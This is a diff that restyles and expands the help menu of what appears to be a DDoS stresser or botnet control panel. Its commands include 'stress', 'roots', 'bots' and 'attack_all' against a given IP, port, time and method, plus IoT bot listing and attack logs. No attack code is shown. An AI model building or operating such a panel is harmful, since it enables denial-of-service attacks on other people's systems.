@@ -1,19 +1,23 @@
-   {YELLOW}╔═════════════╦═════════════════╦════════════════════════════════════════╗
-   ║ {RED}Command{YELLOW}     ║ {RED}Description{YELLOW}     ║ {RED}Command Usage{YELLOW}                          ║
+   {WHITE}╔═════════════╦═════════════════╦════════════════════════════════════════╗
+   ║ {PURPLE}Command{WHITE}     ║ {PURPLE}Description{WHITE}     ║ {PURPLE}Command Usage{WHITE}                          ║
    ╠═════════════╬═════════════════╬════════════════════════════════════════╣
-   ║ {RED}help | ?{YELLOW}    ║ {RED}List of Cmds{YELLOW}    ║ {RED}help | ?{YELLOW}                               ║
-   ║ {RED}Clear{YELLOW}       ║ {RED}Clear Screen{YELLOW}    ║ {RED}clear | cls{YELLOW}                            ║
-   ║ {RED}Methods{YELLOW}     ║ {RED}List of Methods{YELLOW} ║ {RED}Methods{YELLOW}                                ║
-   ║ {RED}Geo IP{YELLOW}      ║ {RED}Geo Locate A IP{YELLOW} ║ {RED}geo <ip>{YELLOW}                               ║
-   ║ {RED}Port Scan{YELLOW}   ║ {RED}Scan for Ports{YELLOW}  ║ {RED}scan <ip>{YELLOW}                              ║
-   ║ {RED}Resolve web{YELLOW} ║ {RED}Grab Backends{YELLOW}   ║ {RED}resolve  {YELLOW}                              ║
-   ║ {RED}Stresser{YELLOW}    ║ {RED}Attack an IP{YELLOW}    ║ {RED}stress <ip> <port> <time> <method>{YELLOW}     ║
-   ║ {RED}Roots{YELLOW}       ║ {RED}Attack an IP{YELLOW}    ║ {RED}roots <ip> <port> <time> <method>{YELLOW}      ║
-   ║ {RED}Bots{YELLOW}        ║ {RED}Attack an IP{YELLOW}    ║ {RED}bots <ip> <port> <time> <method>{YELLOW}       ║
-   ║ {RED}attack_all{YELLOW}  ║ {RED}Attack an IP{YELLOW}    ║ {RED}attack_all <ip> <port> <time> <method>{YELLOW} ║
-   ║ {RED}My Info{YELLOW}     ║ {RED}Account Info{YELLOW}    ║ {RED}myinfo{YELLOW}                                 ║
-   ║ {RED}Change PW{YELLOW}   ║ {RED}Change Password{YELLOW} ║ {RED}passwd <new_pw> <confirm_pw>{YELLOW}           ║
-   ║ {RED}Support{YELLOW}     ║ {RED}Submit a Ticket{YELLOW} ║ {RED}support <message>{YELLOW}                      ║
-   ║ {RED}Admin{YELLOW}       ║ {RED}Admin Cmds{YELLOW}      ║ {RED}admin{YELLOW}                                  ║
-   ╚═════════════╩═════════════════╩════════════════════════════════════════╝{RESET}
+   ║ {PURPLE}Help{WHITE}        ║ {PURPLE}List of Cmds{WHITE}    ║ {PURPLE}help | ?{WHITE}                               ║
+   ║ {PURPLE}Clear{WHITE}       ║ {PURPLE}Clear Screen{WHITE}    ║ {PURPLE}clear | cls{WHITE}                            ║
+   ║ {PURPLE}Username{WHITE}    ║ {PURPLE}account name{WHITE}    ║ {PURPLE}whoami{WHITE}                                 ║
+   ║ {PURPLE}Info{WHITE}        ║ {PURPLE}Show Acc Info{WHITE}   ║ {PURPLE}info{WHITE}                                   ║
+   ║ {PURPLE}Change PW{WHITE}   ║ {PURPLE}Change password{WHITE} ║ {PURPLE}passwd{WHITE}                                 ║
+   ║ {PURPLE}Methods{WHITE}     ║ {PURPLE}Method list{WHITE}     ║ {PURPLE}methods{WHITE}                                ║
+   ║ {PURPLE}Stresser{WHITE}    ║ {PURPLE}Attack an IP{WHITE}    ║ {PURPLE}stress <ip> <port> <time> <method>{WHITE}     ║
+   ║ {PURPLE}Root/Spoofs{WHITE} ║ {PURPLE}Attack an IP{WHITE}    ║ {PURPLE}roots <ip> <port> <time> <method>{WHITE}      ║
+   ║ {PURPLE}Bots{WHITE}        ║ {PURPLE}Attack an IP{WHITE}    ║ {PURPLE}bots <ip> <port> <time> <method>{WHITE}       ║
+   ║ {PURPLE}Attack all{WHITE}  ║ {PURPLE}Attack an IP{WHITE}    ║ {PURPLE}attack_all <ip> <port> <time> <method>{WHITE} ║
+   ║ {PURPLE}Users{WHITE}       ║ {PURPLE}Online users{WHITE}    ║ {PURPLE}users{WHITE}                                  ║
+   ║ {PURPLE}ioT{WHITE}         ║ {PURPLE}List of bots{WHITE}    ║ {PURPLE}iot{WHITE}                                    ║
+   ║ {PURPLE}Message{WHITE}     ║ {PURPLE}Send a message{WHITE}  ║ {PURPLE}msg <user> <msg>{WHITE}                       ║
+   ║ {PURPLE}Ticket{WHITE}      ║ {PURPLE}Submit a ticket{WHITE} ║ {PURPLE}ticket <msg>{WHITE}                           ║
+   ║ {PURPLE}Logs{WHITE}        ║ {PURPLE}All acc logs{WHITE}    ║ {PURPLE}logs{WHITE}                                   ║
+   ║ {PURPLE}attacks{WHITE}     ║ {PURPLE}All attack logs{WHITE} ║ {PURPLE}attacks{WHITE}                                ║
+   ║ {PURPLE}logins{WHITE}      ║ {PURPLE}All login logs{WHITE}  ║ {PURPLE}logins{WHITE}                                 ║
+   ║ {PURPLE}admin{WHITE}       ║ {PURPLE}Admin cmd list{WHITE}  ║ {PURPLE}admin{WHITE}                                  ║
+   ╚═════════════╩═════════════════╩════════════════════════════════════════╝
    
